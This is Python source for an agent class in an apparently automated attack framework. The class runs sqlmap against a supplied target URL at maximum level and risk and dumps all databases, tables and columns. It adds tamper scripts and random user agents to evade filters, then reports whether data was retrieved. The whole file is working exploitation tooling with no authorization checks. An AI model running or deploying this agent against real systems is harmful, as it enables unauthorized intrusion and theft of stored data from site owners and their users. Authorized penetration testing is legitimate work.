from core.data_models import Strategy, SQLInjectionReport, AttackPhase, ErrorType
from core.logger import log
import time

from core.base_agent import BaseAgent


class SQLInjectionExploiter(BaseAgent):
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD]
    required_tools = ["sqlmap"]
    """
    An agent that uses sqlmap to find and exploit SQL injection vulnerabilities.
    """

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.report_class = SQLInjectionReport

    async def run(self, strategy: Strategy, **kwargs) -> SQLInjectionReport:
        start_time = time.time()
        target_url = strategy.context.get("target_url")
        if not target_url:
            log.error(
                "SQL Injection Exploiter: Missing 'target_url' in strategy context.")
            end_time = time.time()
            return self.create_report(
                errors=["Missing 'target_url' in strategy context."],
                error_type=ErrorType.CONFIGURATION,
                summary="SQL Injection exploitation failed: Target URL not provided."
            )

        log.info(f"SQL Injection Exploiter: Running sqlmap on {target_url}")

        command = f'sqlmap -u "{target_url}" --batch --level=5 --risk=3 --dbs --tables --columns --dump --random-agent'

        tamper_script = strategy.context.get("tamper_script")
        if tamper_script:
            log.info(f"Applying tamper script: {tamper_script}")
            command += f" --tamper={tamper_script}"
        else:
            command += " --tamper=space2comment,randomcase"

        log.info(f"Executing command: {command}")
        result = await self.orchestrator.run_shell_command(command, "Run sqlmap to find and exploit SQL injection.")

        stdout = result.get('stdout', '')
        stderr = result.get('stderr', '')
        exit_code = result.get('exit_code')

        if exit_code != 0:
            error_msg = f"sqlmap command failed with exit code {exit_code}. Stderr: {stderr}"
            log.error(error_msg)
            end_time = time.time()
            return self.create_report(
                errors=[error_msg],
                error_type=ErrorType.LOGIC,
                summary="SQL Injection exploitation failed: sqlmap command failed.",
                target_url=target_url,
                command=command,
                output=stdout + stderr
            )

        if "retrieved" in stdout or "vulnerable" in stdout:
            if "retrieved" in stdout:
                message = "Vulnerability exploited and data retrieved."
            else:
                message = "Vulnerability confirmed, but no data retrieved."
            log.success(f"sqlmap found a vulnerability. Output: {stdout}")
            end_time = time.time()
            return self.create_report(
                output=stdout,
                summary=message,
                target_url=target_url,
                command=command
            )
        else:
            message = "Vulnerability not found."
            log.info(f"sqlmap did not find any vulnerabilities. Output: {stdout}")
            end_time = time.time()
            return self.create_report(
                output=stdout,
                summary=message,
                target_url=target_url,
                command=command,
                errors=[message],
                error_type=ErrorType.NO_VULNERABILITY_FOUND
            )
